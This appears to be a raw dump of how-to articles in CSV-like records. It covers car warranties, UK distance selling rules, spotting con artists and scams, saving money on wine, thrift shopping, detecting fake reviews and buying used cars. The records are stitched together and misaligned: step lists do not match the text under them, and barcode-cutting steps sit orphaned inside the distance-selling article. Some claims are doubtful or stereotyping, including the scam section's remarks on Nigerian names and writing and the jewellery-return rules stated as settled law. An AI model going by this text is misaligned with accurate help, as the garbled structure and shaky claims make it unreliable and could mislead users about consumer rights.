Assess coverage options for your warranty. One of the biggest differences between the manufacturer's warranty and a dealer's lot guarantee is that a manufacturer's warranty is something that the car-making company stands behind, repairing cars up to a certain manufacturer standard, and honoring this comprehensive warranty at all participating dealerships. By contrast, the dealer's warranty may only be honored at the individual shop and may not include the same kinds of standards or attention to detail provided in a manufacturer's warranty.;
, Many warranties have a specific coverage period and cost coverage for the classifications of parts and labor separately. Vehicle parts may be covered much longer than the labor on fixes. Evaluate this part of your warranty to understand what is really covered from a parts and labor perspective.

, For the two different classifications of parts and labor, a specific time frame usually applies. Manufacturer's warranties might have a longer time frame, like 5 to 7 years, where the kind of temporary warranty that comes from a used car dealer's lot may be as short as 3 to 6 months for both parts and labor.

, Another very important step is to understand what is and is not covered in your car warranty.


Assess the nature of your car warranty. Some warranties are comprehensive, and these are often called ""bumper-to-bumper"" warranty deals. Others are part specific, including drive train and engine warranties that don't cover peripheral systems.
Look for exclusions. Many auto warranties have specific exclusions for different parts and situations involving mechanical breakdown. Knowing what is not covered can help you plan for situations where you need to arrange for repair costs out of your pocket.

, A good number of warranties require the vehicle owner to keep accurate service records in order to be covered. Read the fine print and comply with these and other requirements.

, Where many manufacturer's warranties indicate they will replace with OEM or originally specified parts, a dealer's warranty will usually only cover any necessary fixes with whatever parts or systems the shop finds appropriate. This aspect of a warranty changes its inherent value, so talk this over with the warranty providers to better understand how you are covered for parts replacement.

",How to Understand the Distance Selling Regulations," Distance selling regulations (DSRs) apply to customers and businesses in the UK and Europe. If you buy something from a website, a mail order company or by the telephone without actually seeing or touching the item, then you are protected.;
, Auctions, such as those you might find on eBay, are excluded from the DSRs unless the seller is a merchant or is using the ""Buy It Now"" format. Additionally, DSRs do not apply to made-to-measure, personalised or perishable items such as flowers.

, By law, a distance seller must provide the following information not only on their site or in their sales pitch, but in a durable medium such as email or on paper. Look for a business address, not a PO BOX, phone number and email contact. Additionally check items are accurately described and that prices include tax. Details of payments accepted and return policies must also be made clear. Any distance seller failing to provide this information is breaking the law.

, The DSRs state that the customer can return an item for any reason as long as they notify the business within seven days. You are entitled to a refund of the cost of the item, as well as any postage you paid to have the item delivered to you. The cost of returning the item to the business often falls to the customer. Check their information to see if this has been made clear.

, The DSRs currently do not exclude pierced jewellery from being returned for a full refund, even if tamper seals are broken. A distance retailer may try to claim otherwise, but the law is clear. However, do your best to make sure you are an understanding customer. Do not try jewellery on if you intend to return it, as due to blood-borne infection, it cannot be resold as new and the business may take you to court for breach of contract.

, As a customer, your responsibility is to make sure that the item you wish to return reaches the business in a resalable condition. Original packaging should be included, as well as any tags. Use recorded post, as this will help prove you met your responsibilities to get it back to them safely.

, If you receive something that is faulty, you can expect for a replacement to be sent to you free of charge, or to receive a full refund including all postage costs that may be incurred.

, Using scissors, carefully cut out each bar code. Include any alphanumeric information underneath the bar code.

, They should be laid out close enough together to fit as many as possible inside a space no larger than two club cards side-by-side. They should be far enough apart that a bar code scanner can easily scan one without hitting another. Leave enough space along one edge so there's room left to label each barcode.

, You'll need to secure them to the paper so they don't move around. You can use removable tape for this, or a glue stick. They don't need to be securely fastened, just well enough to be able to pick up the paper and flip it over without having them fall off.

, If you don't have a laminating machine, you can get it done at a local office store or do it yourself: Take a piece of wide clear packing tape, larger than the card, and cover the folded card with it. Flip it over and cover it with a second piece of packing tape. Depending on the width of the packing tape, you may need to use several pieces to cover the whole thing.

, Cut away excess tape, being sure to leave a little clear tape around the edge. Voila! Ready to be used at your favorite store!

Know the set-up.,
Look for commonalities.,
Know the scam.,
Stop the scam.",How to Spot a Con Artist1," You will receive some form of notification about an award, prize, lottery winning, or other money in the mail along with a check. Shortly after, you will receive a phone call from overseas explaining that the check was designed to cover fees, taxes or insurance on the award, prize, lottery winnings, etc. They will ask you to deposit the check and wire them money., Most telemarketing scams share similar identifiers. The person on the phone will ask for information or request some things from you. Some common elements to look for in telemarketing scams are:You have “won” something, even though you never applied for or competed for anything.
You have to act immediately, or the offer will be invalid.
You have to give them money and information. They will want you to send a check, give them a credit card, routing number, checking account number, bank information, etc.
You don’t need to check out the company or get advice from anyone.

, When you give them a credit card number or deposit their “check” into the bank to cover the fees, taxes, etc., the check will turn out to be counterfeit or they have already charged your credit card, and there is no prize. Essentially, the overall goal of this scam is to get you to release money to them to secure your prize or award, when no such prize or award exists., There are a number of ways you can avoid being taken by this scam. Some are far simpler than others, but the overall idea is that you should not ever release money, either through check, money-wire, or credit card, to someone who if offering you an award or prize. Think hard about this. When was the last time you won something and had to pay for it? Some simple ways to put an end to this charade are:


Just hang up the phone. This is hard when you feel you could be passing up “free” money. Just know that you won’t be getting that prize or award any time soon.Ask the person to contact your attorney and your bank directly. Banks and lawyers know the ins and outs of these types of scams, can stop them immediately, and will alert the authorities about what is going on.Tell the person you need time to think it over and will get back to them. They will likely try to pressure you and tell you that you need to act immediately. Don’t be swayed. They are liars."
"
Know the set-up.,
Note the commonalities.,
Watch for the scam.,
Put a stop to it.",How to Spot a Con Artist2," A prince, king, princess or some other form of royalty has just died in a developing nation (more often than not, Nigeria). The person contacting you, usually by email, will explain that they inherited some incredible sum of money, but they need some small sum of money to get the larger sum released by the bank (to pay taxes, liens, etc.). They are asking you to give them the smaller sum and promising to pay you a much larger portion back when they secure the money.A more recent variation of this set-up is the con artist telling you that he/she is a government official who is illegally transferring money out of Nigeria, and wants your help in his scheme. The 419ers do this because they feel they can keep you from alerting authorities to their scam by including you in their “illegal” plot., Again, there are a number of variations on this scam, but they all entail the same thing- getting your money because you believed someone you never met. Look out for commonalities in 419 scams, which are:


The person who has died is always royalty, and the person contacting you is their rightful heir. More often than not, they will say something to the effect of, “My uncle was the late King of Nigeria.” A simple Google search and common sense should tell you that Nigeria, a modern nation, doesn’t have kings.The money that this person should have access to is being held up by some relatively small sum of money. Think about it, if someone in Nigeria really stood to inherit 5 million dollars, why would they need to reach out to a random stranger in America for $500 or $5,000?For whatever reason, these people tend to use strange and uncommon names, like “Festus”, “Octavius” or “Elmer”. When the name sounds fake, it probably is.
The writing in these letters is usually riddled with spelling errors, grammar mistakes, syntactical errors, etc. Red flags should immediately go up when you see this. Well-positioned, and thus well-educated, Nigerians are well-versed in writing the English language. Why would a prince, who presumably has the best education money can afford, not be able to put a simple sentence together?, After sending the initial email, the person will ask you to respond by wiring them the small sum of money, which they will, of course, pay back with huge sums of interest. Unfortunately for you, there is no large sum of money and you won’t be getting your money back.Often times, the 419ers will string you along for more money. After you send the first amount asked for, they will contact you again and say that there was some problem with the bank and they need more. If you keep sending them money, they will keep asking for more. There is really no pretense under which you can bring these people to justice, so they don’t really have anything to lose or fear by being too greedy., Again, there are a number of ways to spot these scams, and a whole bunch of ways to avoid them. You can ignore the email or letter, pass it on to your attorney or banker, or send the letter to the FBI. You are fine as long as you don’t release any money or personal information to these scammers."

Always review your financial statements.,
Know what to do.,
Report nefarious activity.",How to Spot a Con Artist3," Don’t ever throw away documents with your financial information on them without first shredding them. You can use an automatic shredder, scissors, or your hands for this. Make sure you shred bank and ATM receipts, credit card statements, or bank statements before disposing of them. , Never tell anyone your credit card number unless you know that person is a legitimate representative of a financial institution or real business. Banks and businesses generally refrain from requesting credit card numbers through emails and will not call you out of the blue asking for your credit card number. Never tell someone who called or emailed you your credit card information. , Banks and credit cards will send you monthly statements that will show where and what you spent your money on. Always review these documents carefully and notify your bank immediately if you notice a discrepancy on the statements. You should keep a readily accessible list of numbers to call in the event that you lose your credit cards or your wallet. , In the case that your identity has been stolen, you will want to notify your bank, credit card company and the credit bureau. Ask the credit bureau to make a note in their files that your identity has been stolen so that you have proof of the incident. , If you know of anyone who may be committing identity fraud or is receiving someone else’s bank or credit statements, report them to the FBI or local law enforcement immediately."

Ask how they got your name.,
Get it in writing.,
Ask them to talk to professionals.,
Request references.,
Ignore pressure to act immediately.,
Check for complaints.,
Look out for red flags.,
Know your own weaknesses.,
Be on the lookout for common scams.",How to Spot a Con Artist4," If they can't give you a good answer, they probably got it out of a phonebook, or through another one of their current victims. Long story short, they don't know you, they didn't come across your name through reliable sources, and there is no reason to trust them just because they looked up your phone number and name., Con artists don't like putting their scams in writing, and might try to say they don't have time to do so. Any time a person who is offering you something refuses to put it in writing, you should be very leery of them. They are likely con artists., Any time you think someone may be trying to flim flam you, have them speak with your attorney, financial advisor, or accountant. A con artist will tell you they don't have the time, or they'll take down the contact info, but never make contact with your representatives., Ask to speak with several people who have already completed transactions with this person and seen results. Search for the names and numbers in the phonebook or on the internet to make sure they're real people. Don't accept testimonials as a substitute., A con artist will try to convince you that you have to act right now or else you'll miss your golden opportunity. However, if the good deal is not going to be available tomorrow, then it's not worth the risk., You should take some time to check if any complaints have been filed against the person who is offering you a “great deal” or any other suspicious offer. Chances are the person is not using a real name, but they may be using similar monikers used in other scams. Some resources to find complaints against scam artists are:National Financial Fraud Exchange (http://www.fraud.org/)
North American Securities Administrators Association (http://www.nasaa.org/)

, If you've already entered into a transaction with someone, there are some warning signs you need to be aware of. Keep an eye out for the following warning signs: Secrecy - Are you asked not to tell anyone?
Cash only - Many (but not all) con artists don't like to be paid by check because it leaves a paper trail.
Jackpot just around the corner - The con artist is stringing you along while he or she collects more money from you (e.g. ""Any day now...). Your own denial might allow this procrastination to go on far longer than common sense would allow, because you don't want to face the possibility that you've been duped.Procrastination turns into intimidation - When your patience runs thin and you begin to question the con artist's credibility, you may end up getting treated like a traitor, or even a fool. They might try to intimidate you so you'll stick around until they can flee with the money. (E.g. ""You're as guilty as I am in this.""), There are characteristics and situations that con artists most often exploit. If you possess some of these characteristics, you need to be aware that con artists prey upon:Loneliness
Sense of charity
Desperation regarding money (e.g. heavily indebted, business financial problems)
Being unhappy with your life, and a tendency to look for a ""quick fix""

Falling in love (If a new romantic interest wants you to throw in your lot with theirs, get a second opinion! Ask your family and professionals for their advice.)

, There are too many scams out there to list them all here. However, there are a few general set-ups and types of scams that con artists use often. Be on the lookout for:


Home improvement scams. Con artists will pressure you into making repairs or improvements you don't need.
Bank scams/false bank examiner. The con artist asks the victim (usually an older widow) to test the honesty of employees by withdrawing substantial funds, which are given to the con artist for ""examination"". The victim is given a fake receipt and the con artist disappears with the cash.
Investment scams. These include franchise scams, vending machine scams, land frauds, theft of inventions, securities investments scams, and work-at-home scams
Postal frauds. These are related to chain letters, magazine subscriptions, unordered merchandise, or correspondence courses.
Other scams. There are a handful of other scams out there, such as the bait and switch, charity rackets, computer dating, debt consolidation, contracts, dance lessons, freezer plans, psychic fraud, fortune tellers, health clubs, job placement, lonely hearts, medical quackery, missing heirs, referral sales, talent scouts, pyramid schemes, fake officials.

Have fewer glasses of wine per sitting.,
Adjust the price you are comfortable with.,
Purchase boxed wine instead of bottled wine.,
Check out wines from affordable regions of the world.,
Buy wine in bulk.,
Avoid buying wine in restaurants.",How to Spend Less on Wine," This is perhaps the most obvious, but most effective way to spend less on wine. If you usually have 2 glasses of wine - perhaps 1 with dinner and 1 afterwards - cut down to drinking only 1 glass. Successfully reducing your drinking in this way will immediately cut your wine spending in half!;
, Most grocery stores today stock a wide range of inexpensive wines that offer surprisingly good quality. Begin trying wines that are slightly below the price you normally consider the appropriate minimum. You may be surprised to find that you can't tell the difference at all between your usual wines and more inexpensive varieties.

, Boxed wine, historically stigmatized as unacceptably low quality, has enjoyed a bit of a resurgence recently. Respectable vineyards have begun packaging quality wines in boxed form. Checking out these wines can help save you money - a 3 liter (0.8 US gal) box of wine is the equivalent of 4 regular wine bottles, and usually features a lower price per volume.

, If you have a penchant for French, Italian, or fine Napa Valley wines, you could consider broadening your tastes to include more affordable regions. Chile, Argentina, and Australia all produce quality wines that carry a much lower price tag than many French favorites. Sourcing wine from within your own country is also a good way to find affordable bottles.

, If you don't mind the large initial cash outlay, buying wine by the case is one of the best ways to save money. Many grocery stores and specialty resellers will offer discounts if wine is purchased by the case. Some stores will even offer a discount if you buy 6 mix-and-matched bottles from their shelves.

, It is no secret that wine in restaurants is precipitously marked up in price. If you frequently buy wine in restaurants, consider scaling back. At the least, take advantage of inexpensive house wines, low per-bottle prices, or bring your own wine and simply pay a modest corkage fee.

Decide what you are looking for.,
Try things on.,
Assess quality.,
Have vision.,
Set shopping limits.,
Use your smartphone.,
Shop for sales.,
Look for ""best value"" items.,
Talk to thrift store employees.,
Know how to spot a bargain.,
Search online.,
Consider location.,
Thrift on vacation if possible.,
Utilize other discount shopping venues.,
Get on email lists and shop online when possible.,
Shop seasonally.,
Have a weekly rotation.",How to Shop at Thrift Stores," Listing is a handy way of establishing shopping goals. Also consider the following:It is often best to have a ""master list"" and then create a smaller list of short term goals that need to be addressed first.
Be prepared to search. Some thrift stores are well-organized by gender, size, type of item, or other metrics. Others are a free-for-all of bins and warehouse space. Dress appropriately and be prepared to sort, lift, tug, and push your way through second-hand items.;
, Without trying clothing on, it's difficult to tell whether it is worth your money.Ask for a fitting room with a mirror or a convenient restroom.
Dress in form-fitting attire in case a fitting room is not available. That way you can try on clothing over your existing clothes.
Check if a garment will fit around your waist without trying it on. Button it, and then wrap it around yourself from bellybutton to spine.

, Thrift store items are purchased ""as is""; therefore, it is important to look all purchases over thoroughly before committing to a purchase. Some things to look for are:If looking at clothing, check seams, cuffs and collars for wear and damage. Also look for staining around the neck, armpit, and inseam.
For furniture, make sure that it is sturdy and does not require repairs you are unable to perform.
For appliances, ask to plug the item in to make sure it works before purchasing.
Check the washing instructions. Getting a silk shirt for $3 initially looks like a great deal; however, when you consider that it's ""dry clean only,"" the savings aren't nearly so great.

, Part of thrift shopping is having a basic idea in mind but being open to opportunities when you find them. Consider the following:Recognize when a clothing item could be repaired or resized with minimal tailoring.
Have a style and color scheme in mind for each room you are decorating. This ensures consistency of theme and avoids impulse purchases.
Listen to your gut. Sometimes you may come across an item that you weren't looking for but which is unique, classic, and perfect for a place in your home.

, You never know what you'll find thrift shopping and the temptation to impulse buy is strong. Ways to avoid over-purchasing are:Go shopping with a price limit in mind and stick to it. This may be a limit you set per item, or for the overall trip, but the idea is to remain mindful of how much you are spending.
Don't buy it unless you love it. If you are on the fence about something, take another spin around the store and think about it. If you come back and aren't committed, it wasn't meant to be.

, This works great for vintage or antique items when you are not sure an item is worth the price listed. Go to Google or eBay and see what it would retail for elsewhere., Many stores have weekly ""tag sales,"" where items with a certain color tag go on sale. Other stores have clearance racks or do periodic sales to clear out inventory. Some larger volume stores even do bag sales and sales by the pound for items like clothes and linens.Don't be afraid to haggle. Did you just miss a sale on a large item purchase? Are you making multiple purchases and want to round off the total? Don't be afraid to ask for reasonable accommodation, especially if you are a regular customer.
Don't believe the ""SOLD"" sign. Sometimes the item is already paid for; however, often people say they will come back for something then find something else they like better at a different store. If you see something you love with a sold sign, talk to an employee and/or manager. It's possible the item has been sitting like that for days and no one remembered to remove the sign.
Ask for a discount. Does the item in question have a few flaws that are worth a discount? Is the store running a sale that day? If you are buying sale items, often employees can extend the sale to the rest of the items in your purchase. Some stores also have senior discounts.

, Some types show up in thrift shops looking kind worn out or dated. Other items are donated regularly and you'd never know they were used or second-hand. Look particularly for the items below:Belts: Accessories like belts are one of the first items to get decommissioned from a wardrobe when styles change. An advantage to belts is that, with a little creativity, the buckles can be replaced and a strip of plain leather doesn't really go out of style.Shoes: Decent leather shoes command steep prices in most retail stores, so when you can pick up gently used ones at a thrift store for 90% less, it's a significant savings for your budget. Plus with a little oil and polish, they can look brand new. Furniture: Sometimes retail stores will donate last season's merchandise to area thrift stores for tax purposes. In addition, vintage furniture can be recovered, repainted, or reupholstered with new fabric to look like a chic DIY dream.Jeans: New branded jeans can run from $50 to upwards of $200 dollars while shopping for next-to-new, second-hand jeans usually means paying $10-25 a pair. Especially after Christmas, it's easy to find them with tags still intact.

, The people who work in thrift stores are a wealth of information. Things to ask about are:


What days do shipments arrive? Employees can tell you what days they get new items in and when things go on sale.
Who are they partnered with? They can tell you whether their store has a donation program with a larger retail store where they take possession of clearance items from a prior season.
Have you seen a particular item? If you are a regular customer and make donations, thrift stores will often let you know via phone or email when a specific item you are looking for comes in.

, People often send items to thrift stores not knowing their actual value. Consider the following when thrift shopping:


Brand warranties: Some appliances and kitchen tools have lifetime warranties. For example, Le Creuset cookware is ensured against rust along with other cosmetic issues. Proof of purchase is not required to send an item back to the factory and receive a replacement, free of charge.
Antiques and hidden treasures. Despite wear and condition, items often go to thrift stores that are invaluable, based on their rarity and place within history. If you suspect you've found such an antique, use a smart phone to look for it online and see the price tag other sellers have placed on it.
Tarnish. Tarnished metals looks terrible, but are often easy to shine up with the right polish.

, Many thrift stores have websites that will show up in a basic search. Also consider using thethriftshopper.com to find smaller, independent stores along with larger stores in your area.

, The types of residents living around a thrift store can be a good indicator of the sort of items and level of quality you can expect from a thrift store. For example:Thrift stores in more affluent neighborhoods have better quality furnishings than thrift stores in other parts of town. Also, residents in affluent areas are more likely to redecorate based on style rather than necessity, meaning that it can be easier to find matching items of good quality.
Thrift stores near college campuses are always stocking name brand clothing.

, This works best when vacationing with a car. Especially if you are visiting a large city, larger volume thrift stores tend to offer a wider selection of items, often of better quality. there's also the chance that trends in the area you are visiting are different than where you are from, and you could find unique and eclectic items., Thrift stores are not the only source of bargain shopping.


Flea markets. Show up early— 6am is a good start. Do a sweep for furniture items first, picking and choosing what you want. Don't be afraid to haggle, but be fair to the seller. Once you've found furniture and larger items, load them and look for smaller items-- furniture, accessories, clothing, etc.Consignment stores. These are a type of second-hand store that purchases clothing from sellers as opposed to selling donations. This makes them more expensive than thrift stores, but they are a dependable source of well-made, discounted, name brand clothing that is in fashion at the time of purchase.
Neighborhood yard sales. While yard sales occur in every city almost every weekend, in order to maximize shopping and save time, look for neighborhood yard sales. These often take place in a single location, like a church or school, or span several blocks, with people selling from their own yards. These are a great way to find furniture and antiques.
Estate sales. The ultimate source for gently used antiques, ranging from furniture and dishes, to jewelry and quilts. These take place literally on the ""estate"" where a person lived and require a little more foreknowledge and research in order to get the best deals., Most chain thrift outlets like Goodwill and the Salvation Army will put you on a mailing list for coupon and sale opportunities.


These same stores often take pictures of furniture and other ""in demand"" items and post them online. Reviewing online offerings before shopping can save you trips around town.

, Anticipate what people will be turning out of their closets at certain times during the year. When planning your thrifting trips, for certain items, consider the following:


Shop for summer clothes in the fall when people are thinning out their warm weather clothes in favor of sweaters and coats. The same goes for getting winter clothes in the spring.
Look for kitchen items and accessories after college graduations. When students are done with school, they often move back home or to a new city for employment, leaving behind many gently-used kitchen items, lamps, bedding items, etc.
Look for furniture during the summer and early fall. More people get married during the summer than any other time of year and often have duplicate furniture items that wind up at thrift stores.

, Looking to get the best deals that thrifting has to offer? Create a weekly rotation for thrifting, centered around when new shipments arrive at each store. Other things to consider are:Shop early. If you want to get first pick, arrive as the store opens.
Shop late. On sale days, some stores are looking to clear out all items on sale, and will offer deeper discounts just before closing.

Watch out for “marketing speak.” Very often, fake reviews are created by marketing teams to help boost ratings and/or sales.,
Look for overuse of the product name.,
Beware of extremes.",How to Spot Fake Product Reviews Online1," As such, fake reviews often use jargon that a typical consumer probably wouldn’t. If a review reads like something that would be written on the back of the box, steer clear of it.This can include buzzwords like “one-of-a-kind,” “unique,” “award-winning,” or “revolutionary.”
This can also use the “brand approved” version of the product name, such as always typing the brand in all caps.;
, Additionally, some marketers will fabricate reviews to improve search-engine rankings. In these instances, fake reviews will include multiple instances of the full product name. Once again, no average consumer would normally speak this way.A review might say, “This XYZproduct240 was the best one I could find! The XYZproduct240 arrived quickly, and worked great.”

, Reviews that are scathingly negative are sometimes created by a competitor. Likewise, reviews that are flawless and glowing can sometimes be linked back to a marketer. In reality, most people will find some good things and some bad things in any given product. Reviews that go to either extreme should be given scrutiny. Most people will not categorize something as either the “worst” or “best” product.Watch out for negative words like, “horrible,” “worst,” or “awful.”
Beware of positive superlatives like “best,” incredible,” “life-changing.”

"
"
Check the number of reviews.,
Look for similar reviews and/or similar posting dates.,
Beware of the reviewer who loves everything.,
Scrutinize the username.",How to Spot Fake Product Reviews Online2," To establish the credibility of a given review, try to establish the credibility of the reviewer. Look at a reviewer’s profile. Is this the first and only review they have ever posted? Also, did they just create the account on the day they posted the review? These can be signs that the review and/or the account is falsified., Look again at a reviewer’s profile. Have they created reviews for other products that sound exactly like this one? Alternatively, if they have posted 3 or more reviews for different products within a couple days of each other, this reviewer is likely being paid to post reviews., Look across a reviewer’s posts and ratings. If they seem to love everything they review, or only give out 5-star ratings, they are probably being paid for these posts. Don’t trust a reviewer who loves everything about every product they rate., A username with three or more numbers at the end is probably an automated bot. Particularly if you see multiple reviews for the same product from reviewers with usernames like this, you will not be able to trust these reviews."
"
Use the “copy and paste” test.,
Watch out for coupon-codes or product links.,
Shoot for the middle.",How to Spot Fake Product Reviews Online3," Anytime a review rubs you the wrong way, highlight a key sentence, copy it, and paste it into your search engine. If you see this exact sentence popping up on a number of other review sites (even if it is for different products), this can indicate the review is a fake., If a reviewer includes any kind of link to purchase a product or coupon code, discard it immediately. Whether they are promoting the product they are reviewing, or promoting a different product to purchase instead, such links and codes are definitive red flags., Reviews with either 1-star or 5-star ratings are the most likely to be falsified. If you read mostly 2-4 star reviews, you will eliminate a lot of the guesswork and encounter more genuine reviews."
"
Be Prepared.,
Know your sizes.,
Go on sale days.,
Check the item you're planning to buy.,
Always think out of the box.,
Always remember to bring a friend or two so you can have some fun.",How to Shop Smart at a Thrift Store," This means, take some cash with you. Dress comfortably. Chances are, you're going to go through a lot of time looking at used items. Wear some slip on flats (if you're planning on trying on shoes) and a fitted top for trying on clothes over it. Wear a backpack or a cross body bag, so you have both hands free to look around.;
, Whether it's your clothing size or the measurements of the area you want to put the furniture in, you'll always know if something fits or not.

, Most thrift stores will have a half- off- Saturday or any other deal. That way, instead of getting that violet blouse for ten dollars, you can get it for an even better five dollars.

, Is it damaged? Does it have a broken zipper? Does it have a hole in it? Always inspect the garment you're looking at before buying. This is the same for furniture. Look for scratches, dents, chips, and other dis-functions.

, Sure, that orange shirt does have a hole in it. But it would look nice as a scarf. Always remember to think out of the box. Not every item you find will be perfect, but if you try, you will find a way to make it perfect.

, Thrift shopping can be amazing, and even if you didn't get anything, you still can have a day out with your pals.

Do non-essential shopping a week after the holiday.,
Skip gimmicky deals.,
Wait until January to shop for electronics.",How to Make the Most of Post‐Holiday Sales1," If you charge into a sale-strewn store without a game plan, chances are you’ll exit the store with a cart full of cheap, unneeded items. Avoid impulse purchases and unnecessary spending by thinking about your priorities and making a list before you head to the store.For example, ask yourself who you’re shopping for and what specifically you want. If you’re shopping for yourself, are you looking for electronics, apparel, or seasonal décor? What items specifically?;
, Be it Halloween, Christmas, Valentine’s Day, or New Years Eve, there will be big sales on seasonal decorations once the holiday has passed. As the stores want to clear their shelves of dated merchandise, such as wrapping paper, wreaths, costumes, candies, and colored lights, you can take advantage of steep markdowns and shop for next year’s holiday.Look to big box stores, such as Target and Costco, for the best deals, as well as drug stores, such as Walgreens and CVS.

, No matter how many friends or family members you have, you can bet that you’ll have at least a few presents to buy in the upcoming year. Things like specialty wine or food baskets make great January or February birthday gifts for your favorite adults, while discounted toys can be saved for children's birthdays or next Christmas.If you’re big on Valentine’s day, look out for Christmas gifts that could easily be transformed into romantic presents, such as red or silver candles or gourmet chocolates.

, On-sale items decorated for a particular season, such as candles, beauty products, or towels, can be a great way to save money after the holidays. For example, apple-cinnamon candles marketed for Christmas, skull-embroidered hand-towels for Halloween, or green plastic tumblers made for St. Patricks Day can be used all year-round.


If you’re a video game junkie, check out post-Christmas sales on the year’s most popular titles., Clothing accounts for a huge portion of holiday gifts and merchandise, meaning that it also accounts for a decent chunk—some figures estimate as much as 45%—of the post-Christmas sales. Think specifically about winter items that you know you’ll need next year as well, such as snow boots, winter coats, hats, and scarves.Almost all stores offering apparel will have sales on clothing, but go to department stores in particular if you’re looking for steep discounts on designer labels., From cookies and chocolates to cheese dips and fruit preserves, edible treats are a big part of almost every holiday’s merchandise. While many of these ingestible goodies won’t save until next year, chocolate candies are easily frozen and set aside for next year’s holiday.When freezing chocolate, place it in the refrigerator for 24 hours before moving it to the freezer. Do the same—but in reverse—when taking frozen chocolate out for consumption. This transition period helps preserve the chocolate’s original texture and flavor., You might have noticed that sales discounts increase the more time has lapsed after the holiday. In order to squeeze the most from your post-holiday dollars, wait for several days or a week to check out a store’s offerings. You’ll be surprised what half-off items have gone up to 75% off., Just because a store is offering two-for-one promotions, doesn’t mean you’re saving money. Before snapping up that flashy deal, consider whether or not you need one of the offered item, much less two or several. After all, even if you get a BOGO deal on impulse buy slippers or dog sweaters, you’ve still spent 10-20 dollars on items you weren’t planning on purchasing in the first place.The same goes for trend- or year-specific merchandise. Five years from now, you won’t remember what Duck Dynasty or YOLO even was, much less that you got a three-dollar discount on the themed t-shirt.

, While big electronics chains such as Best Buy boast big markdowns after Thanksgiving, Christmas, and New Years, they’ll offer even bigger discounts in January. This is because, as new television, tablet, and PC models are publicized and released, last year’s models go on sale.In the U.S., televisions go on sale before the Super Bowl, while gaming consoles, headphones, and laptops draw big discounts after Boxing Day and throughout January in the UK."

Consider dealership alternatives.,
Go for 'sale by owner.',
Examine the service records.,
Interview the person as well as test drive and inspect the car.,
Ask to see the car in the morning and ensure that you're able to start it cold for the day.,
Take a good used car candidate to a trusted mechanical repair shop who is very familiar with the vehicle and have them do a comprehensive pre-purchase inspection.,
Run a CarFax.comon the vehicle.,
Take the car for a smog inspection yourself BEFORE you buy the car, even if it already has a smog certification.,
Determine the price of the car based on the market and the quality of the car.,
Buy the car if it passes all the above criteria.,
Think twice before getting the extended warranty.",How to Get the Most for Your Money when Buying a Used Car," Dealerships are convenient, but more expensive. Buying a used car from a used car dealership is much more expensive because about 30% of the purchase price must go into the overhead of maintaining the dealership, paying employees, finance charges and sales commissions. In addition, used car dealerships buy most of their vehicles at auctions, so, much like buying a house at a foreclosure auction, the dealerships never get to test drive the vehicle they are buying. Most of the cars at auctions are the trade in vehicles that the dealerships didn't want to sell themselves. What if we could eliminate these expenses and most of the uncertainties?;
, Buying a used car using the 'for sale by owner ' approach is an effective way of eliminating the used car dealership overhead. However, in order to participate in this market one must have the purchase and registration fees upfront. This means either borrowing the money or saving the necessary cash.

, Screening a well maintained and reliable used car from the mechanically challenged is a way to eliminate the uncertainties. When you make a call to ask about a car, ask to see 3-5 years of sequential service records. If the person has no records, this is a 'tell' about the car and its maintenance. Move on to another vehicle.

, Is the person punctual, are they well groomed, is their living situation neat and orderly? How the person lives and behaves speaks volumes about how they take car of their possessions, including their car.

, 'Stone cold' starting a vehicle can speak volumes about the condition of the engine. If it smokes, other than normal steam condensation out the tail pipe, do NOT buy the car. If it smells odd( sickly sweet, rotten egg smell, burnt oil etc )do NOT buy the car. Used car dealerships almost never let you 'stone cold' start car.

, Do not use generic car used car inspection services, like AAA, because they only perform a skin deep inspection and have no specialized product knowledge. For example, if you're buying a Mercedes Benz, take the car to a shop that specializes in Mercedes. They will know the vehicle fine points and known patter failures and how to properly check for them.

, You can do this after it passes the mechanical pre-purchase inspection so you can see if the vehicle has any hidden accident history.

, Unfortunately, there are still many ways to get a non-compliant vehicle smog certified. Witness the legal inspection of the car and ask the emissions inspector to go over the VIR (Vehicle Inspection Report ) with you and ask him or her what they think of the car and do they see any thing to worry about?

, Check KBB.com for an approximate price of the car. Used cars that have a history of reliability, like a Camry, Corolla, Civic or Accord, hold more than their Kelly Blue Book value. My 1998 Camry is still selling for what I paid for it almost 10 years ago.


Take a pass on an all-wheel drive or 4 wheel drive vehicle. Used 4wd/all wheel drive vehicles are usually much more costly to maintain. Unless you live in a snowbound area or go to a snow area more than 5 times a year, all-wheel drive is a big waste of fuel and involves twice as many moving drive line parts that wear out and need replacing. All wheel drive vehicles tend to wear out their tires much faster and provide at best, a negligible safety advantage when the roads aren't icy or covered with snow.

, This whole process may take some work, but you're getting at least 30% more value and you're proactively creating peace of mind which is priceless.

, They tend to have questionable benefits. It is rare to see an extended warranty company pay out more in a claim than the price of the premium. Choose a used car wisely and save your self a lot of money.

Open a credit line at the store.",How to Make the Most of Post‐Holiday Sales2," Black Friday began as a U.S. market-specific event on the day after Thanksgiving, but in recent years it has become a worldwide phenomenon that spans throughout the week leading up to Black Friday. If you’re looking to score big on Black Friday and Cyber Monday, do your research early and find out what deals stores will be offering on the big day.Amazon offers deals the whole week leading up to Cyber Monday, while some brick-and-mortar and online shops offer Black Friday discounts beginning on Thanksgiving.

, Online shopping has risen steeply and consistently over the past several years, and this trend holds true for post-holiday sales shopping as well. By shopping virtually rather than in-person, you can avoid the long lines and jostling elbows of brick-and-mortar Black Friday frenzies, as well as find special, online offers.Many retailers offer free shipping on post-holiday sales as well, making staying home and waiting a few extra days for your much-anticipated swag even more convenient.

, Once you’ve decided what stores you want to shop on Black Friday or Cyber Monday, be sure to visit their site frequently in order to find out about recently announced promotions. Keep in mind, though, that high demand and the increased popularity of online shopping make these offers extremely time-sensitive, with products often selling out within hours.For example, eBay typically maintains a promotional countdown clock on Black Friday that helps buyers keep track of new and upcoming sales, while Amazon launches new deals every five minutes during Black Friday and the weeks after.

, You might pride yourself on your shopping smarts, but discount-friendly websites, smartphone applications, and browser extensions can boost your retail IQ even higher. Goodshop.com, for example, offers a browser extension that automatically searches and finds active coupons across the web, while the DealNews and Flipp apps keep you abreast of all the latest promotions around you.Flipp can also keep track of your customer loyalty and store-specific credit cards in order to help tailor your shopping preferences and find the most relevant deals for you.
For in-store shopping, download the ShopSavvy app and scan the barcode of any on-sale item you’re considering purchasing. It will check and compare prices for the same item at stores and online outlets around you in order to ensure that you’re getting the best price., Despite the growing popularity and unquestionable convenience of online Black Friday shopping, some people prefer the social aspect and dizzying adrenaline of in-store browsing. Make the most of your day by verifying opening hours and schedules of your favorite brick-and-mortar retailers before venturing out.Some stores offer extended hours on Black Friday, opening at 7 or even 6 a.m., while some stores stay open on Thanksgiving and commence Black Friday deals during the evening.

